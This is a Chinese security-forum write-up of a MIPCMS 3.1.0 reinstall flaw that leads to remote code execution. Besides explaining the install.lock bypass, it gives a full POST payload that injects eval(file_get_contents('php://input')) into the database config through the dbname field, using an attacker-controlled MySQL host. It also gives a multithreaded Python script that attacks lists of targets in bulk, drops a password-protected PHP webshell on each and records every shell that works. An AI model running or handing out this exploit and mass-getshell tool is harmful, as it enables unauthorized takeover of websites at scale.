>
> **[作者：i春秋作家——F0rmat](https://bbs.ichunqiu.com/thread-36511-1-1.html?from=beef)**  
>

## 0x01 前言

  
看下整体的结构，用的是thinkPHP的架构，看到了install这个文件没有可以绕过`install.lock`进行重装，但是里面有一个一定要验证数据库，又要找一个SQL的注入漏洞。  
想起前几天大表哥Bypass发了一篇好像是关于mipcms的漏洞，赶紧去翻了一下，又学到不少技巧，这个技巧可以用在我上次发的一篇[ZZCMS
8.2任意文件删除至Getshell](https://bbs.ichunqiu.com/thread-36511-1-1.html?from=beef)的文章，里面有有个getshell的操作，但是也是要数据库的验证，用上这个技巧也不需要SQL注入也可以getshell了。

关于排版问题，我也想了许多，我写的是markdown的格式，但是论坛对于这种格式效果还算挺兼容的，就是看起来有一些不美观，我就换了种方式进行写，之前我都是放代码然后在上面写解析，这样看起来有点密密麻麻，所以我就直接放代码然后在代码里面写注释，有重要的点就写在外面，这样一来看起来整个文章就很整洁了。

## 0x02 环境

程序源码下载：[http://www.mipcms.cn/mipcms-3.1.0.zip](https://bbs.ichunqiu.com/thread-36511-1-1.html?from=beef)  
Web环境:Deepin Linux+Apache2+PHP5.6+MySQL（192.168.1.101）  
远程数据库服务器:Windows 10 x64（192.168.1.102）

## 0x03 漏洞利用过程

  1. 我们先正常安装程序  

![图片.png](https://image.3001.net/images/20180329/15222953845805.png!small)

2.在远程数据库服务器上面开启远程访问，然后在上面建立一个名为`test',1=>eval(file_get_contents('php://input')),'2'=>'`数据库。  

![图片.png](https://image.3001.net/images/20180329/15222954225828.png!small)  

3.浏览器访问：<http://www.getpass.test//index.php?s=/install/Install/installPost>

POST:

    
    
    username=admin&password=admin&rpassword=admin&dbport=3306&dbname=test',1=>eval(file_get_contents('php://input')),'2'=>'&dbhost=192.168.1.102&dbuser=root&dbpw=root

记得里面的数据库对应上你远程数据库服务器的信息！  

![图片.png](https://image.3001.net/images/20180329/15222958442748.png!small)  

可以看到一句把eval函数写到了配置文件里面了  

![图片.png](https://image.3001.net/images/20180329/15222958561659.png!small)

4.执行代码，具体原理我会在后面构造poc的再详细讲解

浏览器访问：<http://www.getpass.test/system/config/database.php>

POST：`phpinfo();`

![图片.png](https://image.3001.net/images/20180329/15222958758611.png!small)  

## 0x04 框架知识补充

还有人可能不怎么了解这个thinkPHP的框架，我在这里简单讲解下，最好还是去官方解读下[https://www.kancloud.cn/manual/thinkphp5/118003](https://bbs.ichunqiu.com/thread-36511-1-1.html?from=beef)

首先我们现在thinkPHP的配置文件`/system/config/config.php`里面修改下面这两个为`true`

![图片.png](https://image.3001.net/images/20180329/15222958873874.png!small)  

然后去打开网站(这个适合刚刚搭建还没开始安装)，它会自动跳转到安装的页面。做了刚才的设置后会在右下角出现一个`小绿帽`，点击就可以看到文件的加载流程。  

![图片.png](https://image.3001.net/images/20180329/15222958982320.png!small)  

这里有很多文件会预加载，我们主要看它的路由文件`Route.php`  

![图片.png](https://image.3001.net/images/20180329/15222959116901.png!small)  

我们可以看到，这里检查了`install.lock`文件存不存在，如果不存在就会跳转到安装的界面进行安装。  

![图片.png](https://image.3001.net/images/20180329/15222959229008.png!small)  

## 0x05 漏洞代码分析过程

`/app/install/controller/Install.php`问题出现在这个文件，它里面的就在index这里检查的`install.lock`的存在，但是在`installPost`这个方法里面却没有检查，也没有做关联，在`install.html`里面直接就跳过了，从而导致了程序重装。

![图片.png](https://image.3001.net/images/20180329/15222959344707.png!small)  

下面直接按照顺序读下面的代码就行了，我都注释好了。就有两个点：

  1. 一个是遍历数据库内容那里，我输出了`$matches`截图这个内容给你们好理解。

![图片.png](https://image.3001.net/images/20180329/15222959453618.png!small)  

2.再一个是配置文件的替换，读到`$conf = str_replace("#{$key}#", $value,
$conf);`这句的时候我顺便截图了一个配置的内容。  

![图片.png](https://image.3001.net/images/20180329/15222959604013.png!small)

  

## 0x06 Payload构造

  1. 从上面的代码分析下来，我们可以晓得，必须要传入的值有  
`username password rpassword dbport dbname dbhost dbuser dbpw`  
用户名密码这些可以随便写，但是数据库这个在你不晓得数据库信息的时候是无法进行下去的，因为通过上面的代码分析，如果数据库连接不成功就会退出。  
看Bypass大表哥的方法，我一想，特么gb，我咋没想到这种方法呢，wocao。`dbhost`不是可以填服务器地址么，我们在一个服务器上面搭建一个然后进行连接不就行了么，哈哈哈。

  2. 数据库的问题解决了，我们要怎么样写到数据库文件里面呢。写到里面的就有这几个值，数据库的服务器地址和用户名密码是不能动的了，因为Mysql用户默认是16位，可以修改位数，但是数据库会把`,`自动转换为`.`，数据库密码是加密的，还有`prefix`这个参数修改了会造成创建表的出现错误导致程序不能正常执行。

![图片.png](https://image.3001.net/images/20180329/15222960435111.png!small)  

那么我们构造的写进去的信息就不能破坏里面的结构，我们就只能用`dbname`了。

3.还有一个问题，如果我们直接构造一句话木马也不行，因为上面`$dbname=strtolower(input('post.dbname'))`这里用了转换小写，所以一句话的`$_POST`和`$_GET`就不能用了，不能用这个我们还可以用PHP的协议`php://input`来接受值然后用eval和assert来执行。  
我在这里就不再讲解这个协议了，论坛有一篇文章是专门讲这个的，还挺详细的：[https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=27441](https://bbs.ichunqiu.com/thread-36511-1-1.html?from=beef)

4.从上面代码分析，我们可以看出，替换值后面会加上`',`，所以我们要对应上`test',1=>eval(file_get_contents('php://input')),'2'=>'`
**  
最终的Payload：**

username=admin&password=admin&rpassword=admin&dbport=3306&dbname=test',1=>eval(file_get_contents('php://input')),'2'=>'&dbhost=192.168.1.102&dbuser=root&dbpw=root  
  

## 0x07 用Python编写批量getshell脚本

我把配置都写在里面了，需要修改数据库信息直接在代码里面改了，如果加在参数会比较麻烦。

    
    
    #!/usr/bin/env
    #author:F0rmat
    import sys
    import requests
    import threading
    def exploit(target):
        dbhost='192.168.1.102'
        dbuser = 'root'
        dbpw = 'root'
        dbport=3306
        dbname="test',1=>eval(file_get_contents('php://input')),'2'=>'"
        if sys.argv[1]== "-f":
            target=target[0]
        url1=target+"/index.php?s=/install/Install/installPost"
        data={
            "username": "admin",
            "password":  "admin",
            "rpassword": "admin",
            "dbport": dbport,
            "dbname": dbname,
            "dbhost": dbhost,
            "dbuser": dbuser,
            "dbpw": dbpw,
        }
        payload = "fwrite(fopen('shell.php','w'),'<?php @eval($_POST[f0rmat])?>f0rmat');"
        url2=target+"/system/config/database.php"
        shell = target+'/system/config/shell.php'
        try:
            requests.post(url1,data=data).content
            requests.post(url2, data=payload)
            verify = requests.get(shell, timeout=3)
            if "f0rmat" in verify.content:
                print 'Write success,shell url:',shell,'pass:f0rmat'
                with open("success.txt","a+") as f:
                    f.write(shell+'  pass:f0rmat'+"\n")
            else:
                print target,'Write failure!'
        except Exception, e:
            print e
    def main():
        if len(sys.argv)<3:
            print 'python mipcms_3.1.0.py -h target/-f target-file '
        else:
            if sys.argv[1] == "-h":
                exploit(sys.argv[2])
            elif sys.argv[1] == "-f":
                with open(sys.argv[2], "r") as f:
                    b = f.readlines()
                    for i in xrange(len(b)):
                        if not b[i] == "\n":
                            threading.Thread(target=exploit, args=(b[i].split(),)).start()
    
    if __name__ == '__main__':
        main()

![](https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms15.png)

## 0x08 参考

[https://github.com/F0r3at/Python-Tools/tree/master/Mipcms](https://bbs.ichunqiu.com/thread-36511-1-1.html?from=beef)  
[http://www.cnvd.org.cn/flaw/show/CNVD-2018-02516](https://bbs.ichunqiu.com/thread-36511-1-1.html?from=beef)  
[http://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==∣=301419963&idx=1&sn=0cb82aa5629b6432415c93d9f2b8eb8c&chksm=0b55dde63c2254f04399a7afa7f49a3889e8eaa37d747ec1a1b70f00cc0bf94c764db1295a11&mpshare=1&scene=23&srcid=0321pbJgBla01aN1U5GZXNlG#rd](https://bbs.ichunqiu.com/thread-36511-1-1.html?from=beef)

  

